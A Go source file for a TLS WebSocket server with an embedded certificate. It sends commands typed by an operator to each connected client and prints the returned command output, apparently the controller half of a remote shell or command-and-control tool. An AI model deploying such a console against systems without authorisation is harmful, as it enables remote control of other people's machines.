package main

import (
	"crypto/tls"
	"embed"
	"fmt"
	"log"
	"net/http"
	"os"

	"github.com/gorilla/websocket"
)

//go:embed certs/server.crt certs/server.key
var certsFS embed.FS

var upgrader = websocket.Upgrader{}

func main() {
	var host string
	var port string

	if len(os.Args) != 3 {
		fmt.Println("Usage: ./server <host> <port>")
		os.Exit(1)
	}

	host = os.Args[1]
	port = os.Args[2]

	addr := fmt.Sprintf("%s:%s", host, port)
	certPEMBytes, err := certsFS.ReadFile("certs/server.crt")
	if err != nil {
		log.Fatal(err)
	}
	keyPEMBytes, err := certsFS.ReadFile("certs/server.key")
	if err != nil {
		log.Fatal(err)
	}

	cert, err := tls.X509KeyPair(certPEMBytes, keyPEMBytes)
	if err != nil {
		log.Fatal(err)
	}

	http.HandleFunc("/ws", handleConnections)

	server := &http.Server{
		Addr:    addr,
		Handler: nil,
		TLSConfig: &tls.Config{
			Certificates: []tls.Certificate{cert},
		},
	}

	fmt.Printf("WebSocket Server is running on wss://%s\n", addr)
	log.Fatal(server.ListenAndServeTLS("", ""))
}

func handleConnections(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("Error upgrading connection:", err)
		return
	}
	defer conn.Close()

	for {
		// Read command from server input
		var command string
		fmt.Print("Enter command: ")
		fmt.Scanln(&command)

		// Send command to client
		err = conn.WriteMessage(websocket.TextMessage, []byte(command))
		if err != nil {
			log.Println("Error sending command:", err)
			break
		}

		// Read response from client
		_, message, err := conn.ReadMessage()
		if err != nil {
			log.Println("Error reading response:", err)
			break
		}
		fmt.Printf("Command output: %s\n", message)
	}
}
